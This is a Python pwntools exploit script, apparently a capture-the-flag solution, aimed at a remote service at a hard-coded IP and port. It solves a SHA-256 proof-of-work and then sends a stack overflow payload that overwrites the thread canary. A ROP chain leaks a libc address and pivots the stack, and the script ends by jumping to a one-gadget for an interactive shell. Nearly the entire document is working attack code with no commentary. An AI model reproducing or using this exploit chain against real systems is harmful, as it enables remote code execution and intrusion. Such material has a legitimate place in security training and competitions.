from pwn import *
import hashlib
#import hexdump
 
context(arch='amd64',os='linux')
#local=True
local=False
 
if local:
    p = process("./bs")
else:
    p = remote("47.91.226.78", 10005)
 
binary = ELF("./bs")
libc = ELF('./libc.so.6') 
raw_input()

b64_table = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/"
puts_plt = 0x4007c0
puts_got = 0x601fb0
poprdi = 0x400c03
poprsi = 0x400c01
leaveret = 0x400955

def sha256_collision(sha256_input, sha256_answer):
	for i in xrange(64):
		for j in xrange(64):
			for k in xrange(64):
				for l in xrange(64):
					tmp = b64_table[i]+b64_table[j]+b64_table[k]+b64_table[l]+sha256_input
					hash_tmp = hashlib.sha256(tmp).hexdigest()
					#print tmp
					if (hash_tmp == sha256_answer):
						print b64_table[i]+b64_table[j]+b64_table[k]+b64_table[l]
						p.send(b64_table[i]+b64_table[j]+b64_table[k]+b64_table[l]+'\n')
						print p.recv(1024)
						return

if __name__ == '__main__':
	sha256_quest = p.recvline(); print sha256_quest
	print p.recv(1024)
	sha256_input = sha256_quest[12:12+16]; #print sha256_input
	sha256_answer = sha256_quest[33:-1]; #print sha256_answer
	sha256_collision(sha256_input, sha256_answer)

	print p.recv(1024)
	p.send("6192"+'\n')
	
	payload_leak = p64(0x602028)*(0x1018/8) + p64(poprdi) + p64(puts_got) + p64(puts_plt)
	payload_leak += p64(poprdi) + p64(0)
	payload_leak += p64(poprsi) + p64(0x602028)*2 + p64(binary.symbols['read'])
	payload_leak += p64(leaveret)
	payload_leak += p64(0x602028)*((0x1830-0x1018-0x8*10)/8)	# fs:28 => canary(0x1828~)
	p.send(payload_leak)
	print p.recvline();

	puts_addr = u64(p.recv(6)+"\x00\x00")
	libc_base = puts_addr - 0x6f690
	oneshot = libc_base + 0x4526a
	
	print "[+] puts addr : " + hex(puts_addr)
	print "[+] libc base : " + hex(libc_base)
	print "[+] oneshot : " + hex(oneshot)

	p.send(p64(oneshot)*3)

	p.interactive()
